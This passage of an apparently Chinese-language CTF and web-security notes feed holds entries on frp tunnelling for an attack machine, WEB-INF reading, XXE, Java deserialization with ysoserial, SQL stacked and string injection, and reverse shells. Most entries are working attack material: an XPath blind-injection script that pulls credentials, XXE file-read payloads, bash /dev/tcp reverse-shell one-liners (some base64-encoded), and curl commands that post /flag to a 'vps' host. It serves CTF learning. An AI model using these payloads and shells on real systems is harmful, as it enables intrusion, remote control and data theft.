&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bind_port&lt;/span> = &lt;span style="color:#ae81ff">7000&lt;/span> &lt;span style="color:#75715e"># VPS监听端口（你可以改成其他端口）&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="攻击机">
 攻击机
 &lt;a class="anchor" href="#%e6%94%bb%e5%87%bb%e6%9c%ba">#&lt;/a>
&lt;/h3>
&lt;p>注意，记得开启vps上的6000端口和4444端口&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-toml" data-lang="toml">&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[&lt;span style="color:#a6e22e">common&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_addr&lt;/span> = &lt;span style="color:#960050;background-color:#1e0010">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">VPS&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">的&lt;/span>&lt;span style="color:#a6e22e">IP&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">地址&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_port&lt;/span> = &lt;span style="color:#ae81ff">7000&lt;/span> &lt;span style="color:#75715e"># VPS上frps的监听端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[&lt;span style="color:#a6e22e">attack_machine_reverse_proxy&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">type&lt;/span> = &lt;span style="color:#a6e22e">tcp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_ip&lt;/span> = &lt;span style="color:#ae81ff">127.0&lt;/span>.&lt;span style="color:#ae81ff">0.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_port&lt;/span> = &lt;span style="color:#ae81ff">4444&lt;/span> &lt;span style="color:#75715e"># 攻击机上监听的端口（用来接收来自目标的连接）&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">remote_port&lt;/span> = &lt;span style="color:#ae81ff">6000&lt;/span> &lt;span style="color:#75715e"># VPS上开放的远程端口，用来转发流量&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="生成payload">
 生成payload
 &lt;a class="anchor" href="#%e7%94%9f%e6%88%90payload">#&lt;/a>
&lt;/h3>
&lt;p>这个不多说&lt;/p>
&lt;p>注意在填写host的时候些vps地址，port 填remote_port的值(也就是6000端口)&lt;/p>
&lt;p>被攻击机器上线&lt;/p></description></item><item><title>WEB-INF 读取</title><link>http://localhost:1313/docs/network-security/java/web-inf%E8%AF%BB%E5%8F%96/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/java/web-inf%E8%AF%BB%E5%8F%96/</guid><description>&lt;p>WEB-INF读取&lt;/p>
&lt;pre tabindex="0">&lt;code>filename=help.docx
&lt;/code>&lt;/pre>&lt;p>一般来说，出于安全的考虑我们会将网页放在WEB-INF文件下，防止页面直接被访问；&lt;/p>
&lt;p>这里主要说明，如何通过设置web.xml文件，来访问WEB-INF文件下的网页，&lt;/p>
&lt;pre tabindex="0">&lt;code>filename=WEB-INF/web.xml
filename=WEB-INF/classes/struts.xml
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>WEB-INF主要包含一下文件或目录:
/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
/WEB-INF/database.properties：数据库配置文件
漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码
&lt;/code>&lt;/pre>&lt;p>观察其中泄露信息，读取字节码（.class）,在反编译&lt;/p>
&lt;pre tabindex="0">&lt;code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class
&lt;/code>&lt;/pre>&lt;!-- raw HTML omitted -->
&lt;!-- raw HTML omitted --></description></item><item><title>xpath 注入</title><link>http://localhost:1313/docs/network-security/other/xpath%E6%B3%A8%E5%85%A5/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/other/xpath%E6%B3%A8%E5%85%A5/</guid><description>&lt;p>详见&lt;/p>
&lt;p>&lt;a href="https://xz.aliyun.com/t/7791#toc-6">XPATH注入学习 - 先知社区 (aliyun.com)&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>import requests
import re
import time

s = requests.session()
url =&amp;#39;http://400f158d-53cf-4163-82a9-0d5ca129fab9.node4.buuoj.cn:81/login.php&amp;#39;



head ={
 &amp;#34;User-Agent&amp;#34;: &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&amp;#34;,
 &amp;#34;Content-Type&amp;#34;: &amp;#34;application/xml&amp;#34;
}
find =re.compile(&amp;#39;&amp;lt;input type=&amp;#34;hidden&amp;#34; id=&amp;#34;token&amp;#34; value=&amp;#34;(.*?)&amp;#34; /&amp;gt;&amp;#39;)

strs =&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&amp;#39;


flag =&amp;#39;&amp;#39;
for i in range(1,100):
 for j in strs:
 time.sleep(0.2)
 r = s.post(url=url)
 token = find.findall(r.text)
 #猜测根节点名称
 payload_1 = &amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(name(/*[1]), {}, 1)=&amp;#39;{}&amp;#39; or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])
 #猜测子节点名称
 payload_2 = &amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(name(/root/*[1]), {}, 1)=&amp;#39;{}&amp;#39; or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])

 #猜测accounts的节点
 payload_3 =&amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(name(/root/accounts/*[1]), {}, 1)=&amp;#39;{}&amp;#39; or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])

 #猜测user节点
 payload_4 =&amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(name(/root/accounts/user/*[2]), {}, 1)=&amp;#39;{}&amp;#39; or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])

 #跑用户名和密码
 payload_username =&amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(/root/accounts/user[2]/username/text(), {}, 1)=&amp;#39;{}&amp;#39; or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])

 payload_password =&amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(/root/accounts/user[2]/password/text(), {}, 1)=&amp;#39;{}&amp;#39; or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])


 print(payload_username)
 r = s.post(url=url,headers=head,data=payload_password)
 print(r.text)


 if &amp;#34;非法操作&amp;#34; in r.text:
 flag+=j
 print(flag)
 break

 if &amp;#34;用户名或密码错误!&amp;#34; in r.text:
 break

print(flag)
&lt;/code>&lt;/pre></description></item><item><title>XXE</title><link>http://localhost:1313/docs/network-security/other/xxe/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/other/xxe/</guid><description>&lt;p>XXE(XML External Entity attack)XML外部实体注入攻击&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?xml version=&amp;#39;1.0&amp;#39;?&amp;gt; 
&amp;lt;!DOCTYPE x [
 &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///flag&amp;#34;&amp;gt;
]&amp;gt;
 &amp;lt;root&amp;gt;
 &amp;lt;username&amp;gt;
 admin//或者&amp;amp;xxe;
 &amp;lt;/username&amp;gt;
 &amp;lt;password&amp;gt;123&amp;lt;/password&amp;gt;
 &amp;lt;/root&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;code>&amp;amp;xxe;&lt;/code>会输出文件中的内容&lt;/p>
&lt;p>在上传xml文件时，utf8不行可以用utf16&lt;/p>
&lt;pre tabindex="0">&lt;code>iconv -f utf8 -t utf-16 1.xml&amp;gt;2.xml
&lt;/code>&lt;/pre>&lt;p>svg中的xxe&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
&amp;lt;!DOCTYPE note [
&amp;lt;!ENTITY file SYSTEM &amp;#34;file:///proc/self/cwd/flag.txt&amp;#34; &amp;gt;
]&amp;gt;
&amp;lt;svg height=&amp;#34;100&amp;#34; width=&amp;#34;1000&amp;#34;&amp;gt;
 &amp;lt;text x=&amp;#34;10&amp;#34; y=&amp;#34;20&amp;#34;&amp;gt;&amp;amp;file;&amp;lt;/text&amp;gt;
&amp;lt;/svg&amp;gt;
&lt;/code>&lt;/pre>&lt;p>svg中也可以写js，xss&lt;/p></description></item><item><title>反序列化</title><link>http://localhost:1313/docs/network-security/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid><description>&lt;p>分析序列化后的字符串&lt;/p>
&lt;p>例子&lt;/p>
&lt;pre tabindex="0">&lt;code>Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu
&lt;/code>&lt;/pre>&lt;p>作为序列化的标志参考:&lt;/p>
&lt;p>一段数据以rO0AB开头，你基本可以确定这串就是Java序列化base64加密的数据。&lt;/p>
&lt;p>或者如果以aced开头，那么他就是这一段Java序列化的16进制。&lt;/p>
&lt;h3 id="java-deserialization-scanner">
 java Deserialization Scanner
 &lt;a class="anchor" href="#java-deserialization-scanner">#&lt;/a>
&lt;/h3>
&lt;p>这个工具在burp插件里面有，去下载一下，记得初始化插件&lt;/p>
&lt;p>选中发送到插件里（选中右键-&amp;gt;拓展-&amp;gt;Deserialization-&amp;gt;Send request to DS Manual testing）&lt;/p>
&lt;p>在Manual Tetsing中用§包裹住字串，不要包裹Brerer&lt;/p>
&lt;p>下面选择Encode useing Base64，add添加，再选择Encode useing Base64，Attack&lt;/p>
&lt;p>等待一会，会有提示需要1-3minutes&lt;/p>
&lt;p>&lt;img src="C:%5cUsers%5cjinchuan%5cOneDrive%5cnotes%5c%e7%bd%91%e5%ae%89%5cjava%5cassets%5cimage-20221229181834551.png" alt="image-20221229181834551" />&lt;/p>
&lt;p>ROME&lt;/p>
&lt;p>之后用ysoserial 里的MORE&lt;/p>
&lt;p>&lt;a href="https://github.com/frohoff/ysoserial">GitHub - frohoff/ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME &amp;#34;curl http://vps:10189 -d @/flag&amp;#34; &amp;gt; a.bin
&lt;/code>&lt;/pre>&lt;p>base64编码&lt;/p>
&lt;pre tabindex="0">&lt;code>import base64
with open(&amp;#39;a.bin&amp;#39;,&amp;#39;rb&amp;#39;)as f:
	b=f.read()
print(base64.b64encdoe(b))
&lt;/code>&lt;/pre>&lt;p>放到会执行反序列化的地方取请求,触发命令执行&lt;/p>
&lt;p>也可以直接shell&lt;/p>
&lt;pre tabindex="0">&lt;code>bash -i &amp;gt;&amp;amp; /dev/tcp/111.111.111.111/7015 0&amp;gt;&amp;amp;1
进行base64编码，YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME &amp;#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx}|{base64,-d}|{bash,-i}&amp;#34; &amp;gt; a.bin
&lt;/code>&lt;/pre>&lt;p>同上base64编码，记得在前面带上Beaere&lt;/p></description></item><item><title>反弹shell</title><link>http://localhost:1313/docs/network-security/other/%E5%8F%8D%E5%BC%B9shll/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/other/%E5%8F%8D%E5%BC%B9shll/</guid><description>&lt;h2 id="正向链接">
 正向链接
 &lt;a class="anchor" href="#%e6%ad%a3%e5%90%91%e9%93%be%e6%8e%a5">#&lt;/a>
&lt;/h2>
&lt;p>攻击者连接目标机器，如远程桌面，web服务，ssh等&lt;/p>
&lt;h2 id="反向连接">
 反向连接
 &lt;a class="anchor" href="#%e5%8f%8d%e5%90%91%e8%bf%9e%e6%8e%a5">#&lt;/a>
&lt;/h2>
&lt;p>相当于角色反转，让目标机器来找我们，为什么要这样做呢&lt;/p>
&lt;p>常见于命令不回显，受限于防火墙等&lt;/p>
&lt;p>反弹shell,让目标机器来找我们，就得要有一个公网ip&lt;/p>
&lt;p>我们用ngrok.cc送的，可以免费用一个公网端口&lt;/p>
&lt;pre tabindex="0">&lt;code>./sunny clientid 204616381952


free.idcfengye.com:10189
&lt;/code>&lt;/pre>&lt;p>本地映射1234d端口，监听&lt;/p>
&lt;pre tabindex="0">&lt;code>nc -lvp 1234
&lt;/code>&lt;/pre>&lt;h2 id="常见的方式">
 常见的方式
 &lt;a class="anchor" href="#%e5%b8%b8%e8%a7%81%e7%9a%84%e6%96%b9%e5%bc%8f">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1

or

bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&amp;#34;#更稳定

or

echo &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.112/1234 0&amp;gt;&amp;amp;1&amp;#34; | bash

or

bash -i &amp;gt;&amp;amp; /dev/tcp/111.111.111.111/7015 0&amp;gt;&amp;amp;1
#对上面进行base64编码=&amp;gt;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx}|{base64,-d}|{bash,-i}
&lt;/code>&lt;/pre>&lt;p>解释&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>命令&lt;/th>
 &lt;th>详解&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>bash -i&lt;/td>
 &lt;td>产生一个bash交互环境&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&amp;gt;&amp;amp;&lt;/td>
 &lt;td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。这样在被攻击机上就不会显示执行的命令&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>/dev/tcp/47.xxx.xxx.72/2333&lt;/td>
 &lt;td>Linux环境中所有的内容都是以文件的形式存在的，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>0&amp;gt;&amp;amp;1&lt;/td>
 &lt;td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>curl http://vps:7015 -d @/flag
&lt;/code>&lt;/pre>&lt;p>-d参数时post&lt;/p>
&lt;p>@后面时这个文件&lt;/p></description></item><item><title>堆叠注入</title><link>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</guid><description>&lt;p>堆叠注入&lt;/p>
&lt;p>用分号可以 执行多条语句&lt;/p>
&lt;p>查看所有数据库&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;;show databases
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查看当前数据库下所有表名&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;;use 数据库名;show tables
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查看表名下所有字段&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;;use 数据库名;show columns from 表名
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>flag，用预编译的方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;;use 数据库名;set @sql=concat(&amp;#39;&lt;/span>&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">`&lt;/span>fl&lt;span style="color:#e6db74">&amp;#39;,&amp;#39;&lt;/span>ag&lt;span style="color:#f92672">`&lt;/span> fr&lt;span style="color:#75715e">/**/&lt;/span>om Fl&lt;span style="color:#e6db74">&amp;#39;,&amp;#39;&lt;/span>ag&lt;span style="color:#e6db74">&amp;#39;);PRE/**/PARE st/**/mt1 FR/**/OM @sql;EX/**/ECUTE stmt1;#
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>select被过滤，用HANDLER语句，语法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HANDLER&lt;/span> tbl_name &lt;span style="color:#66d9ef">OPEN&lt;/span> [ [&lt;span style="color:#66d9ef">AS&lt;/span>] &lt;span style="color:#66d9ef">alias&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HANDLER&lt;/span> tbl_name &lt;span style="color:#66d9ef">READ&lt;/span> index_name &lt;span style="color:#960050;background-color:#1e0010">{&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">}&lt;/span> (value1,value2,&lt;span style="color:#960050;background-color:#1e0010">…&lt;/span>) [ &lt;span style="color:#66d9ef">WHERE&lt;/span> where_condition ] [&lt;span style="color:#66d9ef">LIMIT&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">…&lt;/span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HANDLER&lt;/span> tbl_name &lt;span style="color:#66d9ef">READ&lt;/span> index_name &lt;span style="color:#960050;background-color:#1e0010">{&lt;/span> &lt;span style="color:#66d9ef">FIRST&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#66d9ef">NEXT&lt;/span> &lt;span style="color:#f92672">|&lt;/span> PREV &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#66d9ef">LAST&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">}&lt;/span> [ &lt;span style="color:#66d9ef">WHERE&lt;/span> where_condition ] [&lt;span style="color:#66d9ef">LIMIT&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">…&lt;/span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HANDLER&lt;/span> tbl_name &lt;span style="color:#66d9ef">READ&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">{&lt;/span> &lt;span style="color:#66d9ef">FIRST&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#66d9ef">NEXT&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">}&lt;/span> [ &lt;span style="color:#66d9ef">WHERE&lt;/span> where_condition ] [&lt;span style="color:#66d9ef">LIMIT&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">…&lt;/span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HANDLER&lt;/span> tbl_name &lt;span style="color:#66d9ef">CLOSE&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;;HANDLER FlagHere open;HANDLER FlagHere read first;HANDLER FlagHere close;# 
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;lsquo;select ``fl&amp;rsquo;,&amp;lsquo;ag&lt;code> &lt;/code>, from Fl&amp;rsquo;,&amp;lsquo;ag&amp;rsquo;&lt;/p></description></item><item><title>字符型注入</title><link>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid><description>&lt;p>字符型注入&lt;/p>
&lt;p>单引号测试，闭合语句&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>报错，查询字段&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39; and 1=2 union select 1,2,3%23
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其他和整型注入一样，不多做解释&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>&lt;span style="color:#66d9ef">rows&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>password
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/**/union/**/select/**/replace(replace(&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/**/union/**/select/**/replace(replace(&amp;#34;&lt;/span>.&lt;span style="color:#e6db74">&amp;#34;,chr(34),chr(39)),chr(46),&amp;#34;&lt;/span>.&lt;span style="color:#e6db74">&amp;#34;)#&amp;#39;,chr(34),chr(39)),chr(46),&amp;#39;1&amp;#34;&lt;/span>&lt;span style="color:#75715e">/**/&lt;/span>&lt;span style="color:#66d9ef">union&lt;/span>&lt;span style="color:#75715e">/**/&lt;/span>&lt;span style="color:#66d9ef">select&lt;/span>&lt;span style="color:#75715e">/**/&lt;/span>&lt;span style="color:#66d9ef">replace&lt;/span>(&lt;span style="color:#66d9ef">replace&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>,chr(&lt;span style="color:#ae81ff">34&lt;/span>),chr(&lt;span style="color:#ae81ff">39&lt;/span>)),chr(&lt;span style="color:#ae81ff">46&lt;/span>),&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>)&lt;span style="color:#f92672">#&lt;/span>&lt;span style="color:#e6db74">&amp;#39;)#
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">0x char chr等价
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>常见端口</title><link>http://localhost:1313/docs/network-security/other/%E7%AB%AF%E5%8F%A3/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/other/%E7%AB%AF%E5%8F%A3/</guid><description>&lt;p>常见端口&lt;/p>
&lt;pre tabindex="0">&lt;code>21
22
23
